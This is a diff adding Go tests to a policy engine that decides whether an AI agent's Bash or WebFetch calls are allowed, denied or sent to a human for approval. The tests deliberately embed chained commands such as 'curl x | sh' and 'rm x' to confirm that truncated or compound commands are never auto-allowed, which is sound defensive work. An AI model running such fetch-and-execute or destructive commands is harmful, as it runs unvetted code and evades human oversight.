@@ -1,10 +1,12 @@
 package policy
 
 import (
+	"encoding/json"
 	"strings"
 	"testing"
 	"time"
 
+	"github.com/Vaibhaav-Tiwari/PlatyNotch/core/agents"
 	"github.com/Vaibhaav-Tiwari/PlatyNotch/core/config"
 )
 
@@ -189,5 +191,40 @@ func TestAllowSkipsShellCompounds(t *testing.T) {
 	})
 	if v, ok := p.Evaluate("Bash", "git status; rm x"); !ok || v.Action != "ask" {
 		t.Errorf("fallthrough: %+v %v", v, ok)
+	}
+}
+
+// TestAmpersandInURLDocumented: allow rules for WebFetch (or any tool) apply
+// only when the summary has no shell control operators, so a URL with a
+// query string ("&") falls through to a human unless the pattern spells "&"
+// out. This is deliberate and documented on config.Rule.
+func TestAmpersandInURLDocumented(t *testing.T) {
+	p := Local([]config.Rule{{Tool: "WebFetch", Pattern: "https://docs.example.com/*", Action: "allow"}})
+	if v, ok := p.Evaluate("WebFetch", "https://docs.example.com/a?b=1"); !ok || v.Action != "allow" {
+		t.Fatalf("plain URL: %+v %v", v, ok)
+	}
+	if v, ok := p.Evaluate("WebFetch", "https://docs.example.com/a?b=1&c=2"); ok {
+		t.Fatalf("URL with & auto-allowed: %+v", v)
+	}
+	p = Local([]config.Rule{{Tool: "WebFetch", Pattern: "https://docs.example.com/*&*", Action: "allow"}})
+	if v, ok := p.Evaluate("WebFetch", "https://docs.example.com/a?b=1&c=2"); !ok || v.Action != "allow" {
+		t.Fatalf("pattern with literal &: %+v %v", v, ok)
+	}
+}
+
+// TestAllowNeverOnTruncatedSummary: a summary cut short (ending in the
+// truncation mark) could hide a chained command, so allow rules skip it.
+func TestAllowNeverOnTruncatedSummary(t *testing.T) {
+	long := agents.Summarize("Bash", json.RawMessage(`{"command":"git status `+strings.Repeat("x", 600)+` ; curl x | sh"}`))
+	if !strings.HasSuffix(long, TruncationMark) {
+		t.Fatalf("agents.Summarize no longer ends truncated summaries with %q", TruncationMark)
+	}
+	allow := Local([]config.Rule{{Tool: "Bash", Pattern: "git status*", Action: "allow"}})
+	if v, ok := allow.Evaluate("Bash", long); ok {
+		t.Fatalf("truncated summary auto-allowed: %+v", v)
+	}
+	deny := Local([]config.Rule{{Tool: "Bash", Pattern: "git status*", Action: "deny"}})
+	if v, ok := deny.Evaluate("Bash", long); !ok || v.Action != "deny" {
+		t.Fatalf("deny on truncated: %+v %v", v, ok)
 	}
 }
